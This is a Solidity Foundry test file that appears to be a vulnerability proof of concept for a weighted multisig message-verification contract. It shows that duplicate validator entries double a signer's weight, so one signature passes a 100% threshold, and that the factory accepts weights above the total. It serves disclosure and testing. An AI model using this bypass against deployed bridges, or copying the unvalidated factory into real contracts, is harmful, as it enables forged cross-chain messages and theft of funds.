// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity >=0.8.0;

import {Test} from "forge-std/Test.sol";

import {StaticMessageIdWeightedMultisigIsmFactory, StaticMessageIdWeightedMultisigIsm} from "contracts/isms/multisig/WeightedMultisigIsm.sol";
import {IStaticWeightedMultisigIsm} from "contracts/interfaces/isms/IWeightedMultisigIsm.sol";
import {CheckpointLib} from "contracts/libs/CheckpointLib.sol";
import {Message} from "contracts/libs/Message.sol";
import {MessageUtils} from "./IsmTestUtils.sol";

/**
 * PoC: the *weighted* multisig ISM has the same duplicate-validator quorum
 * collapse as the plain variant, and it is strictly worse in two ways.
 *
 * 1. Weight is SUMMED, not counted. A duplicated entry doesn't just fill an
 *    extra slot — it adds that validator's weight a second time, directly
 *    doubling their voting power.
 *
 * 2. `StaticWeightedValidatorSetFactory.deploy` performs NO validation at all
 *    — not even the `0 < threshold <= length` guard that the plain
 *    `StaticThresholdAddressSetFactory` has. There is no duplicate check and
 *    no check that validator weights sum to (or stay within) TOTAL_WEIGHT.
 *
 * `AbstractStaticWeightedMultisigIsm.verify` uses the same monotonic cursor:
 *
 *     while (idx < validators.length && signer != validators[idx].signingAddress) ++idx;
 *     require(idx < validators.length, "Invalid signer");
 *     _totalWeight += validators[idx].weight;
 *     ++idx;
 *
 * so [{A, 50%}, {A, 50%}, {B, ...}] lets A alone reach a 100% threshold.
 */
contract WeightedMultisigDuplicate_PoC is Test {
    uint32 constant ORIGIN = 1;
    uint32 constant DESTINATION = 2;
    bytes32 constant MERKLE_TREE_HOOK = bytes32(uint256(0xBEEF));
    bytes32 constant ROOT = bytes32(uint256(0xF00D));
    uint32 constant INDEX = 7;

    // AbstractStaticWeightedMultisigIsm.TOTAL_WEIGHT
    uint96 constant TOTAL_WEIGHT = 1e10;
    uint96 constant HALF = 5e9;

    StaticMessageIdWeightedMultisigIsmFactory factory;

    function setUp() public {
        factory = new StaticMessageIdWeightedMultisigIsmFactory();
    }

    function _message() internal pure returns (bytes memory) {
        return
            MessageUtils.formatMessage(
                3,
                0,
                ORIGIN,
                bytes32(uint256(0xA11CE)),
                DESTINATION,
                bytes32(uint256(0xB0B)),
                bytes("payload")
            );
    }

    function _metadataRepeating(
        bytes memory sig,
        uint256 n
    ) internal pure returns (bytes memory md) {
        md = abi.encodePacked(MERKLE_TREE_HOOK, ROOT, INDEX);
        for (uint256 i = 0; i < n; i++) {
            md = abi.encodePacked(md, sig);
        }
    }

    function _sigFor(
        uint256 pk,
        bytes memory message
    ) internal pure returns (bytes memory) {
        bytes32 d = CheckpointLib.digest(
            ORIGIN,
            MERKLE_TREE_HOOK,
            ROOT,
            INDEX,
            Message.id(message)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, d);
        return abi.encodePacked(r, s, v);
    }

    /// Control: a clean 50/50 set cannot be satisfied by one validator alone.
    function test_cleanSet_oneValidatorCannotReachFullWeight() public {
        (address a, uint256 pkA) = makeAddrAndKey("A");
        (address b, ) = makeAddrAndKey("B");

        IStaticWeightedMultisigIsm.ValidatorInfo[]
            memory vals = new IStaticWeightedMultisigIsm.ValidatorInfo[](2);
        vals[0] = IStaticWeightedMultisigIsm.ValidatorInfo(a, HALF);
        vals[1] = IStaticWeightedMultisigIsm.ValidatorInfo(b, HALF);

        StaticMessageIdWeightedMultisigIsm ism = StaticMessageIdWeightedMultisigIsm(
                factory.deploy(vals, TOTAL_WEIGHT)
            );

        bytes memory message = _message();
        bytes memory metadata = _metadataRepeating(_sigFor(pkA, message), 2);

        // A's weight (50%) alone cannot reach the 100% threshold.
        vm.expectRevert();
        ism.verify(metadata, message);
    }

    /// The bug: duplicating A doubles A's weight — A alone reaches 100%.
    function test_duplicateValidator_weightDoubleCounted() public {
        (address a, uint256 pkA) = makeAddrAndKey("A");
        (address b, ) = makeAddrAndKey("B");

        // Nominally "A 50%, B 50%" — but A is listed twice.
        IStaticWeightedMultisigIsm.ValidatorInfo[]
            memory vals = new IStaticWeightedMultisigIsm.ValidatorInfo[](3);
        vals[0] = IStaticWeightedMultisigIsm.ValidatorInfo(a, HALF);
        vals[1] = IStaticWeightedMultisigIsm.ValidatorInfo(a, HALF); // duplicate
        vals[2] = IStaticWeightedMultisigIsm.ValidatorInfo(b, HALF);

        StaticMessageIdWeightedMultisigIsm ism = StaticMessageIdWeightedMultisigIsm(
                factory.deploy(vals, TOTAL_WEIGHT)
            );

        // Factory accepted it with zero validation.
        (
            IStaticWeightedMultisigIsm.ValidatorInfo[] memory got,
            uint96 thr
        ) = ism.validatorsAndThresholdWeight(bytes(""));
        assertEq(got.length, 3);
        assertEq(
            got[0].signingAddress,
            got[1].signingAddress,
            "duplicate validator persisted on-chain"
        );
        assertEq(thr, TOTAL_WEIGHT);

        bytes memory message = _message();
        // ONE signature from A, supplied twice.
        bytes memory metadata = _metadataRepeating(_sigFor(pkA, message), 2);

        assertTrue(
            ism.verify(metadata, message),
            "WEIGHT DOUBLE-COUNTED: one validator reached a 100% threshold alone"
        );
    }

    /// The weighted factory performs no validation whatsoever: weights are not
    /// required to sum to (or stay within) TOTAL_WEIGHT, so a nominal
    /// "60% threshold" can silently be a minority of actual total weight.
    function test_factoryAcceptsWeightsExceedingTotalWeight() public {
        (address a, ) = makeAddrAndKey("A");
        (address b, ) = makeAddrAndKey("B");

        IStaticWeightedMultisigIsm.ValidatorInfo[]
            memory vals = new IStaticWeightedMultisigIsm.ValidatorInfo[](2);
        // Sum = 2 * TOTAL_WEIGHT — nonsensical, but accepted.
        vals[0] = IStaticWeightedMultisigIsm.ValidatorInfo(a, TOTAL_WEIGHT);
        vals[1] = IStaticWeightedMultisigIsm.ValidatorInfo(b, TOTAL_WEIGHT);

        address ism = factory.deploy(vals, 6e9); // "60%"
        assertTrue(ism.code.length > 0, "factory deployed an over-weighted set");
        // A alone (weight 1e10) now exceeds the 6e9 "60%" threshold, i.e. the
        // nominal 60%-of-stake is really 33% of actual total weight.
    }
}
